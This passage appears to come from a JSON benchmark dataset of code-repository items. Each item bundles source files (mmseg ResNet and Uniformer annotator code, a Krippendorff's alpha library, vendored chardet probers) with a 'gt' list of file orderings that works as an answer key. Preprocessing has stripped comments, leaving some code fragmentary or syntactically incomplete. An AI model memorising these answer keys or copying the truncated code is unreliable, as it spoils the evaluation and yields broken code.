stage. Default: None\n        contract_dilation (bool): Whether contract first dilation of each layer\n            Default: False\n        with_cp (bool): Use checkpoint or not. Using checkpoint will save some\n            memory while slowing down the training speed.\n        zero_init_residual (bool): Whether to use zero init for last norm layer\n            in resblocks to let them behave as identity.\n\n    Example:\n        >>> from annotator.uniformer.mmseg.models import ResNet\n        >>> import torch\n        >>> self = ResNet(depth=18)\n        >>> self.eval()\n        >>> inputs = torch.rand(1, 3, 32, 32)\n        >>> level_outputs = self.forward(inputs)\n        >>> for level_out in level_outputs:\n        ...     print(tuple(level_out.shape))\n        (1, 64, 8, 8)\n        (1, 128, 4, 4)\n        (1, 256, 2, 2)\n        (1, 512, 1, 1)\n    make plugins for ResNet 'stage_idx'th stage .\n\n        Currently we support to insert 'context_block',\n        'empirical_attention_block', 'nonlocal_block' into the backbone like\n        ResNet/ResNeXt. They could be inserted after conv1/conv2/conv3 of\n        Bottleneck.\n\n        An example of plugins format could be :\n        >>> plugins=[\n        ...     dict(cfg=dict(type='xxx', arg1='xxx'),\n        ...          stages=(False, True, True, True),\n        ...          position='after_conv2'),\n        ...     dict(cfg=dict(type='yyy'),\n        ...          stages=(True, True, True, True),\n        ...          position='after_conv3'),\n        ...     dict(cfg=dict(type='zzz', postfix='1'),\n        ...          stages=(True, True, True, True),\n        ...          position='after_conv3'),\n        ...     dict(cfg=dict(type='zzz', postfix='2'),\n        ...          stages=(True, True, True, True),\n        ...          position='after_conv3')\n        ... ]\n        >>> self = ResNet(depth=18)\n        >>> stage_plugins = self.make_stage_plugins(plugins, 0)\n        >>> assert len(stage_plugins) == 3\n\n        Suppose 'stage_idx=0', the structure of blocks in the stage would be:\n            conv1-> conv2->conv3->yyy->zzz1->zzz2\n        Suppose 'stage_idx=1', the structure of blocks in the stage would be:\n            conv1-> conv2->xxx->conv3->yyy->zzz1->zzz2\n\n        If stages is missing, the plugin would be applied to all stages.\n\n        Args:\n            plugins (list[dict]): List of plugins cfg to build. The postfix is\n                required if multiple same type plugins are inserted.\n            stage_idx (int): Index of stage to build\n\n        Returns:\n            list[dict]: Plugins for current stage\n        Pack all blocks in a stage into a ``ResLayer``.nn.Module: the normalization layer named \"norm1\" Make stem layer for ResNet.Freeze stages param and norm stats.Initialize the weights in backbone.\n\n        Args:\n            pretrained (str, optional): Path to pre-trained weights.\n                Defaults to None.\n        Forward function.Convert the model into training mode while keep normalization layer\n        freezed.ResNetV1c variant described in [1]_.\n\n    Compared with default ResNet(ResNetV1b), ResNetV1c replaces the 7x7 conv\n    in the input stem with three 3x3 convs.\n\n    References:\n        .. [1] https://arxiv.org/pdf/1812.01187.pdf\n    ResNetV1d variant described in [1]_.\n\n    Compared with default ResNet(ResNetV1b), ResNetV1d replaces the 7x7 conv in\n    the input stem with three 3x3 convs. And in the downsampling block, a 2x2\n    avg_pool with stride 2 is added before conv, whose stride is changed to 1.\n    Collect the information of the running environments.\"\"\"\n    env_info = collect_base_env()\n    env_info['MMSegmentation'] = f'{mmseg.__version__}+{get_git_hash()[:7]}'\n\n    return env_info\n\n\nif __name__ == '__main__':\n    for name, val in collect_env().items():\n        print('{}: {}'.format(name, val))\n\n'controlvideo/annotator/uniformer/__init__.py'\n:import os\n\nfrom annotator.uniformer.mmseg.apis import init_segmentor, inference_segmentor, show_result_pyplot\nfrom annotator.uniformer.mmseg.core.evaluation import get_palette\nfrom annotator.util import annotator_ckpts_path\n\n\ncheckpoint_file = \"https://huggingface.co/lllyasviel/ControlNet/resolve/main/annotator/ckpts/upernet_global_small.pth\"\n\n\nclass UniformerDetector:\n    def __init__(self):\n        modelpath = os.path.join(annotator_ckpts_path, \"upernet_global_small.pth\")\n        if not os.path.exists(modelpath):\n            from basicsr.utils.download_util import load_file_from_url\n            load_file_from_url(checkpoint_file, model_dir=annotator_ckpts_path)\n        config_file = os.path.join(os.path.dirname(annotator_ckpts_path), \"uniformer\", \"exp\", \"upernet_global_small\", \"config.py\")\n        self.model = init_segmentor(config_file, modelpath).cuda()\n\n    def __call__(self, img):\n        result = inference_segmentor(self.model, img)\n        res_img = show_result_pyplot(self.model, img, result, get_palette('ade'), opacity=1)\n        return res_img\n\n'controlvideo/annotator/uniformer/mmseg/utils/__init__.py'\n:from .collect_env import collect_env\nfrom .logger import get_root_logger\n\n__all__ = ['get_root_logger', 'collect_env']\n\n'controlvideo/annotator/util.py'\n:import numpy as np\nimport cv2\nimport os\nimport torch\n\nannotator_ckpts_path = os.path.join(os.path.dirname(__file__), 'ckpts')\n\ndef get_control(type):\n    if type == 'canny':\n        from .canny import CannyDetector\n        apply_control = CannyDetector()\n    elif type == 'openpose':\n        from .openpose import OpenposeDetector\n        apply_control = OpenposeDetector()\n    elif type == 'depth' or type == 'normal':\n        from .midas import MidasDetector\n        apply_control = MidasDetector()\n    elif type == 'hed':\n        from .hed import HEDdetector\n        apply_control = HEDdetector()\n    elif type == 'scribble':\n        apply_control = None\n    elif type == 'seg':\n        from .uniformer import UniformerDetector\n        apply_control = UniformerDetector()\n    elif type == 'mlsd':\n        from .mlsd import MLSDdetector\n        apply_control = MLSDdetector()\n    else:\n        raise TypeError(type)\n    return apply_control\n\n\ndef HWC3(x):\n    assert x.dtype == np.uint8\n    if x.ndim == 2:\n        x = x[:, :, None]\n    assert x.ndim == 3\n    H, W, C = x.shape\n    assert C == 1 or C == 3 or C == 4\n    if C == 3:\n        return x\n    if C == 1:\n        return np.concatenate([x, x, x], axis=2)\n    if C == 4:\n        color = x[:, :, 0:3].astype(np.float32)\n        alpha = x[:, :, 3:4].astype(np.float32) / 255.0\n        y = color * alpha + 255.0 * (1.0 - alpha)\n        y = y.clip(0, 255).astype(np.uint8)\n        return y\n\n\ndef resize_image(input_image, resolution):\n    H, W, C = input_image.shape\n    H = float(H)\n    W = float(W)\n    k = float(resolution) / min(H, W)\n    H *= k\n    W *= k\n    H = int(np.round(H / 64.0)) * 64\n    W = int(np.round(W / 64.0)) * 64\n    img = cv2.resize(input_image, (W, H), interpolation=cv2.INTER_LANCZOS4 if k > 1 else cv2.INTER_AREA)\n    return img\n\n'controlvideo/annotator/uniformer/mmseg/models/backbones/__init__.py'\n:from .cgnet import CGNet\n\nfrom .hrnet import HRNet\nfrom .mobilenet_v2 import MobileNetV2\nfrom .mobilenet_v3 import MobileNetV3\nfrom .resnest import ResNeSt\nfrom .resnet import ResNet, ResNetV1c, ResNetV1d\nfrom .resnext import ResNeXt\nfrom .unet import UNet\nfrom .vit import VisionTransformer\nfrom .uniformer import UniFormer\n\n__all__ = [\n    'ResNet', 'ResNetV1c', 'ResNetV1d', 'ResNeXt', 'HRNet',\n    'ResNeSt', 'MobileNetV2', 'UNet', 'CGNet', 'MobileNetV3',\n    'VisionTransformer', 'UniFormer'\n]\n",
        "gt": [
            "'controlvideo/annotator/util.py'",
            "'controlvideo/annotator/uniformer/__init__.py'",
            "'controlvideo/annotator/uniformer/mmseg/utils/collect_env.py'",
            "'controlvideo/annotator/uniformer/mmseg/utils/__init__.py'",
            "'controlvideo/annotator/uniformer/mmseg/models/backbones/resnet.py'",
            "'controlvideo/annotator/uniformer/mmseg/models/backbones/__init__.py'"
        ]
    },
    {
        "files": [
            "'fast-krippendorff/krippendorff/krippendorff.py'",
            "'fast-krippendorff/krippendorff/__init__.py'",
            "'fast-krippendorff/sample.py'"
        ],
        "content": "'fast-krippendorff/krippendorff/krippendorff.py'\n:\nfrom __future__ import annotations\n\nfrom typing import Literal, Protocol, TypeVar, Union\n\nimport numpy as np\nimport numpy.typing as npt\n\nDEFAULT_DTYPE = np.float_\n\n\nValueScalarType = TypeVar(\"ValueScalarType\", bound=np.generic)\nMetricResultScalarType = TypeVar(\"MetricResultScalarType\", bound=np.inexact)\n\n\nclass DistanceMetric(Protocol):\n    def __call__(self, v1: npt.NDArray[ValueScalarType], v2: npt.NDArray[ValueScalarType], i1: npt.NDArray[np.int_],\n                 i2: npt.NDArray[np.int_], n_v: npt.NDArray[MetricResultScalarType],\n                 dtype: np.dtype[MetricResultScalarType] = DEFAULT_DTYPE) -> npt.NDArray[MetricResultScalarType]:\n\n\n\nLevelOfMeasurement = Union[Literal[\"nominal\", \"ordinal\", \"interval\", \"ratio\"], DistanceMetric]\n\n\ndef _nominal_metric(v1: npt.NDArray[ValueScalarType], v2: npt.NDArray[ValueScalarType],\n                    i1: npt.NDArray[np.int_], i2: npt.NDArray[np.int_],\n                    n_v: npt.NDArray[MetricResultScalarType],\n                    dtype: np.dtype[MetricResultScalarType] = DEFAULT_DTYPE) -> npt.NDArray[MetricResultScalarType]:\n\n    return (v1 != v2).astype(dtype)\n\n\ndef _ordinal_metric(v1: npt.NDArray[ValueScalarType], v2: npt.NDArray[ValueScalarType],\n                    i1: npt.NDArray[np.int_], i2: npt.NDArray[np.int_], n_v: npt.NDArray[np.number],\n                    dtype: np.dtype[MetricResultScalarType] = DEFAULT_DTYPE) -> npt.NDArray[MetricResultScalarType]:\n\n    i1, i2 = np.minimum(i1, i2), np.maximum(i1, i2)\n\n    ranges = np.dstack((i1, i2 + 1))\n    sums_between_indices = np.add.reduceat(np.append(n_v, 0), ranges.reshape(-1))[::2].reshape(*i1.shape)\n\n    return (sums_between_indices - np.divide(n_v[i1] + n_v[i2], 2, dtype=dtype)) ** 2\n\n\ndef _interval_metric(v1: npt.NDArray[ValueScalarType], v2: npt.NDArray[ValueScalarType],\n                     i1: npt.NDArray[np.int_], i2: npt.NDArray[np.int_], n_v: npt.NDArray[np.number],\n                     dtype: np.dtype[MetricResultScalarType] = DEFAULT_DTYPE) -> npt.NDArray[MetricResultScalarType]:\n\n    return (v1 - v2).astype(dtype) ** 2\n\n\ndef _ratio_metric(v1: npt.NDArray[ValueScalarType], v2: npt.NDArray[ValueScalarType], i1: npt.NDArray[np.int_],\n                  i2: npt.NDArray[np.int_], n_v: npt.NDArray[np.number],\n                  dtype: np.dtype[MetricResultScalarType] = DEFAULT_DTYPE) -> npt.NDArray[MetricResultScalarType]:\n\n    v1_plus_v2 = v1 + v2\n    return np.divide(v1 - v2, v1_plus_v2, out=np.zeros(np.broadcast(v1, v2).shape), where=v1_plus_v2 != 0,\n                     dtype=dtype) ** 2\n\n\ndef _coincidences(value_counts: npt.NDArray[np.int_],\n                  dtype: np.dtype[MetricResultScalarType] = DEFAULT_DTYPE) -> npt.NDArray[MetricResultScalarType]:\n\n    N, V = value_counts.shape\n    pairable = np.maximum(value_counts.sum(axis=1), 2)\n    diagonals = value_counts[:, np.newaxis, :] * np.eye(V)[np.newaxis, ...]\n    unnormalized_coincidences = value_counts[..., np.newaxis] * value_counts[:, np.newaxis, :] - diagonals\n    return np.divide(unnormalized_coincidences, (pairable - 1).reshape((-1, 1, 1)), dtype=dtype).sum(axis=0)\n\n\ndef _random_coincidences(\n        n_v: npt.NDArray[MetricResultScalarType],\n        dtype: np.dtype[MetricResultScalarType] = DEFAULT_DTYPE) -> npt.NDArray[MetricResultScalarType]:\n\n    return np.divide(np.outer(n_v, n_v) - np.diagflat(n_v), n_v.sum() - 1, dtype=dtype)\n\n\ndef _distances(value_domain: npt.NDArray[ValueScalarType], distance_metric: DistanceMetric, n_v: npt.NDArray[np.int_],\n               dtype: np.dtype[MetricResultScalarType] = DEFAULT_DTYPE) -> npt.NDArray[MetricResultScalarType]:\n\n    indices = np.arange(len(value_domain))\n    return distance_metric(value_domain[:, np.newaxis], value_domain[np.newaxis, :], i1=indices[:, np.newaxis],\n                           i2=indices[np.newaxis, :], n_v=n_v, dtype=dtype)\n\n\ndef _distance_metric(level_of_measurement: LevelOfMeasurement) -> DistanceMetric:\n    \"\"\"Distance metric callable of the level of measurement.\n\n    Parameters\n    ----------\n    level_of_measurement : string or callable\n        Steven's level of measurement of the variable.\n        It must be one of \"nominal\", \"ordinal\", \"interval\", \"ratio\", or a callable.\n\n    Returns\n    -------\n    metric : callable\n        Distance callable.\n    \"\"\"\n    return {\n        \"nominal\": _nominal_metric,\n        \"ordinal\": _ordinal_metric,\n        \"interval\": _interval_metric,\n        \"ratio\": _ratio_metric,\n    }.get(level_of_measurement, level_of_measurement)\n\n\ndef _reliability_data_to_value_counts(reliability_data: npt.NDArray[ValueScalarType],\n                                      value_domain: npt.NDArray[ValueScalarType]) -> npt.NDArray[np.int_]:\n\n    return (reliability_data.T[..., np.newaxis] == value_domain[np.newaxis, np.newaxis, :]).sum(axis=1)\n\n\ndef alpha(reliability_data: npt.ArrayLike | None = None, value_counts: npt.ArrayLike | None = None,\n          value_domain: npt.ArrayLike | None = None, level_of_measurement: LevelOfMeasurement = \"interval\",\n          dtype: npt.DTypeLike = DEFAULT_DTYPE) -> float:\n    \"\"\"Compute Krippendorff's alpha.\n\n    See https://en.wikipedia.org/wiki/Krippendorff%27s_alpha for more information.\n\n    Parameters\n    ----------\n    reliability_data : array_like, with shape (M, N)\n        Reliability data matrix which has the rate the i coder gave to the j unit, where M is the number of raters\n        and N is the unit count.\n        Missing rates are represented with `np.nan`.\n        If it's provided then `value_counts` must not be provided.\n\n    value_counts : array_like, with shape (N, V)\n        Number of coders that assigned a certain value to a determined unit, where N is the number of units\n        and V is the value count.\n        If it's provided then `reliability_data` must not be provided.\n\n    value_domain : array_like, with shape (V,)\n        Possible values the units can take.\n        If the level of measurement is not nominal, it must be ordered.\n        If `reliability_data` is provided, then the default value is the ordered list of unique rates that appear.\n        Else, the default value is `list(range(V))`.\n\n    level_of_measurement : string or callable\n        Steven's level of measurement of the variable.\n        It must be one of \"nominal\", \"ordinal\", \"interval\", \"ratio\", or a callable.\n\n    dtype : data-type\n        Result and computation data-type.\n\n    Returns\n    -------\n    alpha : ndarray\n        Scalar value of Krippendorff's alpha of type `dtype`.\n\n    Examples\n    --------\n    >>> reliability_data = [[np.nan, np.nan, np.nan, np.nan, np.nan, 3, 4, 1, 2, 1, 1, 3, 3, np.nan, 3],\n    ...                     [1, np.nan, 2, 1, 3, 3, 4, 3, np.nan, np.nan, np.nan, np.nan, np.nan, np.nan, np.nan],\n    ...                     [np.nan, np.nan, 2, 1, 3, 4, 4, np.nan, 2, 1, 1, 3, 3, np.nan, 4]]\n    >>> print(round(alpha(reliability_data=reliability_data, level_of_measurement=\"nominal\"), 6))\n    0.691358\n    >>> print(round(alpha(reliability_data=reliability_data, level_of_measurement=\"interval\"), 6))\n    0.810845\n    >>> value_counts = np.array([[1, 0, 0, 0],\n    ...                          [0, 0, 0, 0],\n    ...                          [0, 2, 0, 0],\n    ...                          [2, 0, 0, 0],\n    ...                          [0, 0, 2, 0],\n    ...                          [0, 0, 2, 1],\n    ...                          [0, 0, 0, 3],\n    ...                          [1, 0, 1, 0],\n    ...                          [0, 2, 0, 0],\n    ...                          [2, 0, 0, 0],\n    ...                          [2, 0, 0, 0],\n    ...                          [0, 0, 2, 0],\n    ...                          [0, 0, 2, 0],\n    ...                          [0, 0, 0, 0],\n    ...                          [0, 0, 1, 1]])\n    >>> print(round(alpha(value_counts=value_counts, level_of_measurement=\"nominal\"), 6))\n    0.691358\n    >>>\n    >>>\n    >>> reliability_data = [[1, 2, 3, 3, 2, 1, 4, 1, 2, np.nan, np.nan, np.nan],\n    ...                     [1, 2, 3, 3, 2, 2, 4, 1, 2, 5, np.nan, 3],\n    ...                     [np.nan, 3, 3, 3, 2, 3, 4, 2, 2, 5, 1, np.nan],\n    ...                     [1, 2, 3, 3, 2, 4, 4, 1, 2, 5, 1, np.nan]]\n    >>> print(round(alpha(reliability_data, level_of_measurement=\"ordinal\"), 3))\n    0.815\n    >>> print(round(alpha(reliability_data, value_domain=[1,2,3,4,5], level_of_measurement=\"ordinal\"), 3))\n    0.815\n    >>> print(round(alpha(reliability_data, level_of_measurement=\"ratio\"), 3))\n    0.797\n    >>> reliability_data = [[\"very low\", \"low\", \"mid\", \"mid\", \"low\", \"very low\", \"high\", \"very low\", \"low\", np.nan,\n    ...                      np.nan, np.nan],\n    ...                     [\"very low\", \"low\", \"mid\", \"mid\", \"low\", \"low\", \"high\", \"very low\", \"low\", \"very high\",\n    ...                      np.nan, \"mid\"],\n    ...                     [np.nan, \"mid\", \"mid\", \"mid\", \"low\", \"mid\", \"high\", \"low\", \"low\", \"very high\", \"very low\",\n    ...                      np.nan],\n    ...                     [\"very low\", \"low\", \"mid\", \"mid\", \"low\", \"high\", \"high\", \"very low\", \"low\", \"very high\",\n    ...                      \"very low\", np.nan]]\n    >>> print(round(alpha(reliability_data, level_of_measurement=\"ordinal\",\n    ...                   value_domain=[\"very low\", \"low\", \"mid\", \"high\", \"very high\"]), 3))\n    0.815\n    >>>\n    >>> print(round(alpha(reliability_data, level_of_measurement=\"nominal\"), 3))\n    0.743\n    \"\"\"\n    if (reliability_data is None) == (value_counts is None):\n        raise ValueError(\"Either reliability_data or value_counts must be provided, but not both.\")\n\n\n    if value_counts is None:\n        reliability_data = np.asarray(reliability_data)\n\n        kind = reliability_data.dtype.kind\n        if kind in {\"i\", \"u\", \"f\"}:\n\n            computed_value_domain = np.unique(reliability_data[~np.isnan(reliability_data)])\n        elif kind in {\"U\", \"S\"}:\n\n            computed_value_domain = np.unique(reliability_data[reliability_data != \"nan\"])\n        else:\n            raise ValueError(f\"Don't know how to construct value domain for dtype kind {kind}.\")\n\n        if value_domain is None:\n\n            if kind in {\"U\", \"S\"} and level_of_measurement != \"nominal\":\n                raise ValueError(\"When using strings, an ordered value_domain is required \"\n                                 \"for level_of_measurement other than 'nominal'.\")\n            value_domain = computed_value_domain\n        else:\n            value_domain = np.asarray(value_domain)\n\n\n            if not np.isin(computed_value_domain, value_domain).all():\n                raise ValueError(\"The reliability data contains out-of-domain values.\")\n\n        value_counts = _reliability_data_to_value_counts(reliability_data, value_domain)\n    else:\n        value_counts = np.asarray(value_counts)\n\n        if value_domain is None:\n            value_domain = np.arange(value_counts.shape[1])\n        else:\n            value_domain = np.asarray(value_domain)\n            if value_counts.shape[1] != len(value_domain):\n                raise ValueError(\"The value domain should be equal to the number of columns of value_counts.\")\n\n    if len(value_domain) <= 1:\n        raise ValueError(\"There has to be more than one value in the domain.\")\n\n    if (value_counts.sum(axis=-1) <= 1).all():\n        raise ValueError(\"There has to be at least one unit with values assigned by at least two coders.\")\n\n    dtype = np.dtype(dtype)\n    if not np.issubdtype(dtype, np.inexact):\n        raise ValueError(\"`dtype` must be an inexact type.\")\n\n    distance_metric = _distance_metric(level_of_measurement)\n\n    o = _coincidences(value_counts, dtype=dtype)\n    n_v = o.sum(axis=0)\n    e = _random_coincidences(n_v, dtype=dtype)\n    d = _distances(value_domain, distance_metric, n_v, dtype=dtype)\n    return 1 - (o * d).sum() / (e * d).sum()\n\n'fast-krippendorff/krippendorff/__init__.py'\n:from krippendorff.krippendorff import alpha\n\n'fast-krippendorff/sample.py'\n:\nimport numpy as np\n\nimport krippendorff\n\n\ndef main():\n    print(\"Example from https://en.wikipedia.org/wiki/Krippendorff's_Alpha\")\n    print()\n    reliability_data_str = (\n        \"*    *    *    *    *    3    4    1    2    1    1    3    3    *    3\",\n        \"1    *    2    1    3    3    4    3    *    *    *    *    *    *    *\",\n        \"*    *    2    1    3    4    4    *    2    1    1    3    3    *    4\",\n    )\n    print(\"\\n\".join(reliability_data_str))\n    print()\n\n    reliability_data = [[np.nan if v == \"*\" else int(v) for v in coder.split()] for coder in reliability_data_str]\n\n    print(\"Krippendorff's alpha for nominal metric: \", krippendorff.alpha(reliability_data=reliability_data,\n                                                                          level_of_measurement=\"nominal\"))\n    print(\"Krippendorff's alpha for interval metric: \", krippendorff.alpha(reliability_data=reliability_data))\n\n    print()\n    print()\n    print(\"From value counts:\")\n    print()\n    value_counts = np.array([[1, 0, 0, 0],\n                             [0, 0, 0, 0],\n                             [0, 2, 0, 0],\n                             [2, 0, 0, 0],\n                             [0, 0, 2, 0],\n                             [0, 0, 2, 1],\n                             [0, 0, 0, 3],\n                             [1, 0, 1, 0],\n                             [0, 2, 0, 0],\n                             [2, 0, 0, 0],\n                             [2, 0, 0, 0],\n                             [0, 0, 2, 0],\n                             [0, 0, 2, 0],\n                             [0, 0, 0, 0],\n                             [0, 0, 1, 1]])\n    print(value_counts)\n    print(\"Krippendorff's alpha for nominal metric: \", krippendorff.alpha(value_counts=value_counts,\n                                                                          level_of_measurement=\"nominal\"))\n    print(\"Krippendorff's alpha for interval metric: \", krippendorff.alpha(value_counts=value_counts))\n\n\nif __name__ == '__main__':\n    main()\n",
        "gt": [
            "'fast-krippendorff/krippendorff/krippendorff.py'",
            "'fast-krippendorff/krippendorff/__init__.py'",
            "'fast-krippendorff/sample.py'"
        ]
    },
    {
        "files": [
            "'fuckCoreMail/requests/packages/chardet/sjisprober.py'",
            "'fuckCoreMail/requests/packages/chardet/chardetect.py'",
            "'fuckCoreMail/requests/packages/chardet/universaldetector.py'",
            "'fuckCoreMail/requests/packages/chardet/mbcsgroupprober.py'"
        ],
        "content": "'fuckCoreMail/requests/packages/chardet/sjisprober.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport sys\nfrom .mbcharsetprober import MultiByteCharSetProber\nfrom .codingstatemachine import CodingStateMachine\nfrom .chardistribution import SJISDistributionAnalysis\nfrom .jpcntx import SJISContextAnalysis\nfrom .mbcssm import SJISSMModel\nfrom . import constants\n\n\nclass SJISProber(MultiByteCharSetProber):\n    def __init__(self):\n        MultiByteCharSetProber.__init__(self)\n        self._mCodingSM = CodingStateMachine(SJISSMModel)\n        self._mDistributionAnalyzer = SJISDistributionAnalysis()\n        self._mContextAnalyzer = SJISContextAnalysis()\n        self.reset()\n\n    def reset(self):\n        MultiByteCharSetProber.reset(self)\n        self._mContextAnalyzer.reset()\n\n    def get_charset_name(self):\n        return self._mContextAnalyzer.get_charset_name()\n\n    def feed(self, aBuf):\n        aLen = len(aBuf)\n        for i in range(0, aLen):\n            codingState = self._mCodingSM.next_state(aBuf[i])\n            if codingState == constants.eError:\n                if constants._debug:\n                    sys.stderr.write(self.get_charset_name()\n                                     + ' prober hit error at byte ' + str(i)\n                                     + '\\n')\n                self._mState = constants.eNotMe\n                break\n            elif codingState == constants.eItsMe:\n                self._mState = constants.eFoundIt\n                break\n            elif codingState == constants.eStart:\n                charLen = self._mCodingSM.get_current_charlen()\n                if i == 0:\n                    self._mLastChar[1] = aBuf[0]\n                    self._mContextAnalyzer.feed(self._mLastChar[2 - charLen:],\n                                                charLen)\n                    self._mDistributionAnalyzer.feed(self._mLastChar, charLen)\n                else:\n                    self._mContextAnalyzer.feed(aBuf[i + 1 - charLen:i + 3\n                                                     - charLen], charLen)\n                    self._mDistributionAnalyzer.feed(aBuf[i - 1:i + 1],\n                                                     charLen)\n\n        self._mLastChar[0] = aBuf[aLen - 1]\n\n        if self.get_state() == constants.eDetecting:\n            if (self._mContextAnalyzer.got_enough_data() and\n               (self.get_confidence() > constants.SHORTCUT_THRESHOLD)):\n                self._mState = constants.eFoundIt\n\n        return self.get_state()\n\n    def get_confidence(self):\n        contxtCf = self._mContextAnalyzer.get_confidence()\n        distribCf = self._mDistributionAnalyzer.get_confidence()\n        return max(contxtCf, distribCf)\n\n'fuckCoreMail/requests/packages/chardet/chardetect.py'\n:\n\n\nfrom __future__ import absolute_import, print_function, unicode_literals\n\nimport argparse\nimport sys\nfrom io import open\n\nfrom chardet import __version__\nfrom chardet.universaldetector import UniversalDetector\n\n\ndef description_of(lines, name='stdin'):\n\n    u = UniversalDetector()\n    for line in lines:\n        u.feed(line)\n    u.close()\n    result = u.result\n    if result['encoding']:\n        return '{0}: {1} with confidence {2}'.format(name, result['encoding'],\n                                                     result['confidence'])\n    else:\n        return '{0}: no result'.format(name)\n\n\ndef main(argv=None):\n\n\n    parser = argparse.ArgumentParser(\n        description=\"Takes one or more file paths and reports their detected \\\n                     encodings\",\n        formatter_class=argparse.ArgumentDefaultsHelpFormatter,\n        conflict_handler='resolve')\n    parser.add_argument('input',\n                        help='File whose encoding we would like to determine.',\n                        type=argparse.FileType('rb'), nargs='*',\n                        default=[sys.stdin])\n    parser.add_argument('--version', action='version',\n                        version='%(prog)s {0}'.format(__version__))\n    args = parser.parse_args(argv)\n\n    for f in args.input:\n        if f.isatty():\n            print(\"You are running chardetect interactively. Press \" +\n                  \"CTRL-D twice at the start of a blank line to signal the \" +\n                  \"end of your input. If you want help, run chardetect \" +\n                  \"--help\\n\", file=sys.stderr)\n        print(description_of(f, f.name))\n\n\nif __name__ == '__main__':\n    main()\n\n'fuckCoreMail/requests/packages/chardet/universaldetector.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom . import constants\nimport sys\nimport codecs\nfrom .latin1prober import Latin1Prober\nfrom .mbcsgroupprober import MBCSGroupProber\nfrom .sbcsgroupprober import SBCSGroupProber\nfrom .escprober import EscCharSetProber\nimport re\n\nMINIMUM_THRESHOLD = 0.20\nePureAscii = 0\neEscAscii = 1\neHighbyte = 2\n\n\nclass UniversalDetector:\n    def __init__(self):\n        self._highBitDetector = re.compile(b'[\\x80-\\xFF]')\n        self._escDetector = re.compile(b'(\\033|~{)')\n        self._mEscCharSetProber = None\n        self._mCharSetProbers = []\n        self.reset()\n\n    def reset(self):\n        self.result = {'encoding': None, 'confidence': 0.0}\n        self.done = False\n        self._mStart = True\n        self._mGotData = False\n        self._mInputState = ePureAscii\n        self._mLastChar = b''\n        if self._mEscCharSetProber:\n            self._mEscCharSetProber.reset()\n        for prober in self._mCharSetProbers:\n            prober.reset()\n\n    def feed(self, aBuf):\n        if self.done:\n            return\n\n        aLen = len(aBuf)\n        if not aLen:\n            return\n\n        if not self._mGotData:\n\n            if aBuf[:3] == codecs.BOM_UTF8:\n\n                self.result = {'encoding': \"UTF-8-SIG\", 'confidence': 1.0}\n            elif aBuf[:4] == codecs.BOM_UTF32_LE:\n\n                self.result = {'encoding': \"UTF-32LE\", 'confidence': 1.0}\n            elif aBuf[:4] == codecs.BOM_UTF32_BE:\n\n                self.result = {'encoding': \"UTF-32BE\", 'confidence': 1.0}\n            elif aBuf[:4] == b'\\xFE\\xFF\\x00\\x00':\n\n                self.result = {\n                    'encoding': \"X-ISO-10646-UCS-4-3412\",\n                    'confidence': 1.0\n                }\n            elif aBuf[:4] == b'\\x00\\x00\\xFF\\xFE':\n\n                self.result = {\n                    'encoding': \"X-ISO-10646-UCS-4-2143\",\n                    'confidence': 1.0\n                }\n            elif aBuf[:2] == codecs.BOM_LE:\n\n                self.result = {'encoding': \"UTF-16LE\", 'confidence': 1.0}\n            elif aBuf[:2] == codecs.BOM_BE:\n\n                self.result = {'encoding': \"UTF-16BE\", 'confidence': 1.0}\n\n        self._mGotData = True\n        if self.result['encoding'] and (self.result['confidence'] > 0.0):\n            self.done = True\n            return\n\n        if self._mInputState == ePureAscii:\n            if self._highBitDetector.search(aBuf):\n                self._mInputState = eHighbyte\n            elif ((self._mInputState == ePureAscii) and\n                    self._escDetector.search(self._mLastChar + aBuf)):\n                self._mInputState = eEscAscii\n\n        self._mLastChar = aBuf[-1:]\n\n        if self._mInputState == eEscAscii:\n            if not self._mEscCharSetProber:\n                self._mEscCharSetProber = EscCharSetProber()\n            if self._mEscCharSetProber.feed(aBuf) == constants.eFoundIt:\n                self.result = {'encoding': self._mEscCharSetProber.get_charset_name(),\n                               'confidence': self._mEscCharSetProber.get_confidence()}\n                self.done = True\n        elif self._mInputState == eHighbyte:\n            if not self._mCharSetProbers:\n                self._mCharSetProbers = [MBCSGroupProber(), SBCSGroupProber(),\n                                         Latin1Prober()]\n            for prober in self._mCharSetProbers:\n                if prober.feed(aBuf) == constants.eFoundIt:\n                    self.result = {'encoding': prober.get_charset_name(),\n                                   'confidence': prober.get_confidence()}\n                    self.done = True\n                    break\n\n    def close(self):\n        if self.done:\n            return\n        if not self._mGotData:\n            if constants._debug:\n                sys.stderr.write('no data received!\\n')\n            return\n        self.done = True\n\n        if self._mInputState == ePureAscii:\n            self.result = {'encoding': 'ascii', 'confidence': 1.0}\n            return self.result\n\n        if self._mInputState == eHighbyte:\n            proberConfidence = None\n            maxProberConfidence = 0.0\n            maxProber = None\n            for prober in self._mCharSetProbers:\n                if not prober:\n                    continue\n                proberConfidence = prober.get_confidence()\n                if proberConfidence > maxProberConfidence:\n                    maxProberConfidence = proberConfidence\n                    maxProber = prober\n            if maxProber and (maxProberConfidence > MINIMUM_THRESHOLD):\n                self.result = {'encoding': maxProber.get_charset_name(),\n                               'confidence': maxProber.get_confidence()}\n                return self.result\n\n        if constants._debug:\n            sys.stderr.write('no probers hit minimum threshhold\\n')\n            for prober in self._mCharSetProbers[0].mProbers:\n                if not prober:\n                    continue\n                sys.stderr.write('%s confidence = %s\\n' %\n                                 (prober.get_charset_name(),\n                                  prober.get_confidence()))\n\n'fuckCoreMail/requests/packages/chardet/mbcsgroupprober.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom .charsetgroupprober import CharSetGroupProber\nfrom .utf8prober import UTF8Prober\nfrom .sjisprober import SJISProber\nfrom .eucjpprober import EUCJPProber\nfrom .gb2312prober import GB2312Prober\nfrom .euckrprober import EUCKRProber\nfrom .cp949prober import CP949Prober\nfrom .big5prober import Big5Prober\nfrom .euctwprober import EUCTWProber\n\n\nclass MBCSGroupProber(CharSetGroupProber):\n    def __init__(self):\n        CharSetGroupProber.__init__(self)\n        self._mProbers = [\n            UTF8Prober(),\n            SJISProber(),\n            EUCJPProber(),\n            GB2312Prober(),\n            EUCKRProber(),\n            CP949Prober(),\n            Big5Prober(),\n            EUCTWProber()\n        ]\n        self.reset()\n",
        "gt": [
            "'fuckCoreMail/requests/packages/chardet/sjisprober.py'",
